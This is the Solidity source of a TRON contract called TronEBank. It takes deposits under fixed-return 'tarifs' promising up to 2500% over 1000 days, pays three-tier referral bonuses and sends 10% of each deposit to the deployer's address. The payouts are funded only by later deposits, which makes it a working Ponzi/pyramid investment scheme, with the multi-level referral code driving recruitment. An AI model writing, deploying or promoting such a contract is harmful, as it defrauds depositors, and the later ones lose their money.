//SourceUnit: TronEBank.sol

pragma solidity ^0.5.4;

contract TronEBank {

	struct Tarif {
		uint life_days;
		uint percent;
	}

	struct Deposit {
		uint tarif;
		uint amount;
		uint time;
		uint totalWithdraw;
	}

	struct Investor {
		bool registered;
		address referer;
		uint referrals_tier1;
		uint referrals_tier2;
		uint referrals_tier3;
		uint balanceRef;
		uint totalRef;
		Deposit[] deposits;
		uint invested;
		uint paidAt;
		uint withdrawn;
	}

	uint MIN_DEPOSIT = 10 trx;
	uint START_AT = 1598950800;

	address payable public support = msg.sender;

	Tarif[] public tarifs;
	uint[] public refRewards;
	uint public totalInvestors;
	uint public totalInvested;
	uint public totalRefRewards;
	mapping (address => Investor) public investors;

	event DepositAt(address user, uint tarif, uint amount);
	event Withdraw(address user, uint amount);

	constructor() public {

		tarifs.push(Tarif(1000, 2500));
		tarifs.push(Tarif(58, 203));
		tarifs.push(Tarif(34, 153));
		tarifs.push(Tarif(24, 132));
		
		refRewards.push(5);
		refRewards.push(2);
		refRewards.push(1);
	}

	function deposit(uint tarif, address referer) external payable {

		//require(block.timestamp >= START_AT);
		require(msg.value >= MIN_DEPOSIT);
		require(tarif < tarifs.length);
		require(referer != msg.sender);

		register(referer);
		support.transfer(msg.value / 10);
		rewardReferers(msg.value, investors[msg.sender].referer);

		investors[msg.sender].invested += msg.value;
		totalInvested += msg.value;

		investors[msg.sender].deposits.push(Deposit(tarif, msg.value, block.timestamp, 0));

		emit DepositAt(msg.sender, tarif, msg.value);
	}
	
	function withdraw() external {
        
        Investor storage investor = investors[msg.sender];
		
		uint amount = withdrawable(msg.sender); 
		amount += investor.balanceRef;
		
		require(amount > 0);

		if (msg.sender.send(amount)) {
		  investor.withdrawn += amount;
		  investor.balanceRef = 0;
		  updateInvestments(msg.sender);
		  investor.paidAt = block.timestamp;
		  emit Withdraw(msg.sender, amount);
		}
	}
	

	function withdrawable(address user) public view returns (uint amount) {

		Investor storage investor = investors[user];

		for (uint i = 0; i < investor.deposits.length; i++) {
		  Deposit storage dep = investor.deposits[i];
		  Tarif storage tarif = tarifs[dep.tarif];
		  
		  uint finish = dep.time + tarif.life_days  * 86400;
		  uint since = investor.paidAt > dep.time ? investor.paidAt : dep.time;
		  uint till = block.timestamp > finish ? finish : block.timestamp;

		  if (since < till) {
			amount += dep.amount * (till - since) * tarif.percent / tarif.life_days / 8640000;
		  }
		}
	}
	
	function updateInvestments(address user) internal {
	    
		Investor storage investor = investors[user];

		for (uint i = 0; i < investor.deposits.length; i++) {
		  Deposit storage dep = investor.deposits[i];
		  Tarif storage tarif = tarifs[dep.tarif];
		  
		  uint finish = dep.time + tarif.life_days * 86400;
		  uint since = investor.paidAt > dep.time ? investor.paidAt : dep.time;
		  uint till = block.timestamp > finish ? finish : block.timestamp;

		  if (since < till) {
			investor.deposits[i].totalWithdraw += dep.amount * (till - since) * tarif.percent / tarif.life_days / 8640000;
		  }
		}
	}
	
	function allInvestments(address _addr) view external returns(uint[] memory ids, uint[] memory endTimes, uint[] memory amounts, uint[] memory totalWithdraws) {
	
        Investor storage investor = investors[_addr];

        uint[] memory _ids = new uint[](investor.deposits.length);
        uint[] memory _endTimes = new uint[](investor.deposits.length);
        uint[] memory _amounts = new uint[](investor.deposits.length);
        uint[] memory _totalWithdraws = new uint[](investor.deposits.length);

        for(uint256 i = 0; i < investor.deposits.length; i++) {
            
          Deposit storage dep = investor.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
	
	function register(address referer) internal {

		if (!investors[msg.sender].registered) {
		
		  investors[msg.sender].registered = true;
		  totalInvestors++;
		  
		  if (investors[referer].registered && referer != msg.sender) {
			investors[msg.sender].referer = referer;
			
			address rec = referer;
			for (uint i = 0; i < refRewards.length; i++) {
			  if (!investors[rec].registered) {
				break;
			  }
			  if (i == 0) {
				investors[rec].referrals_tier1++;
			  }
			  if (i == 1) {
				investors[rec].referrals_tier2++;
			  }
			  if (i == 2) {
				investors[rec].referrals_tier3++;
			  }
			  rec = investors[rec].referer;
			}
		  }
		}
	}

	function rewardReferers(uint amount, address referer) internal {
	
		address rec = referer;

		for (uint i = 0; i < refRewards.length; i++) {
		  if (!investors[rec].registered) {
			break;
		  }
		  
		  uint a = amount * refRewards[i] / 100;
		  investors[rec].balanceRef += a;
		  investors[rec].totalRef += a;
		  totalRefRewards += a;
		  
		  rec = investors[rec].referer;
		}
	}
}